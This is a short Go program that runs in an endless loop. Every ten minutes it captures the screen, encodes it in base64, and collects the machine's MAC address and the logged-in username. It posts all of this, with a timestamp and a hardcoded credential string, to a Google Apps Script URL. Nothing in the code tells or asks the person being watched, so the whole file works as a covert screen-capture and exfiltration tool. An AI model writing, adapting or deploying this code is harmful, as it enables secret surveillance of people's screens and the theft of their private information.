package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/jpeg"
	"net"
	"net/http"
	"net/url"
	"os/user"
	"time"

	"github.com/vova616/screenshot"
)

func main() {
	for {
		var err1, err2, err3, err4 error
		img, err1 := screenshot.CaptureScreen()
		if err1 == nil {
			buf := new(bytes.Buffer)
			jpeg.Encode(buf, img, nil)
			bufBytes := buf.Bytes()
			imgBase64Str := base64.StdEncoding.EncodeToString(bufBytes)

			var macaddress string
			interfaces, err2 := net.Interfaces()
			if err2 == nil {
				for _, i := range interfaces {
					if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {
						macaddress = i.HardwareAddr.String()
						break
					}
				}

				user, err3 := user.Current()
				if err3 == nil {
					t := time.Now()
					systym := t.Format("15:04:05/2006-01-02")
					credential := "controller@philosopher"
					postData := url.Values{"macid": {macaddress}, "username": {user.Username}, "snap": {imgBase64Str}, "systym": {systym}, "credential": {credential}}
					resp, err4 := http.PostForm("https://script.google.com/macros/s/AKfycbzJp3YRf0QsyY1fkO19HQc2rTCK-W0AC4hPP5fwf9AWDCoRPuw/exec", postData)
					if err4 == nil {
						fmt.Println(resp.StatusCode)
					}
				}
			}
		}
		if err1 == nil && err2 == nil && err3 == nil && err4 == nil {
			fmt.Println("done")
		} else {
			fmt.Println("skipping")
		}
		time.Sleep(time.Second * 600)
	}
}
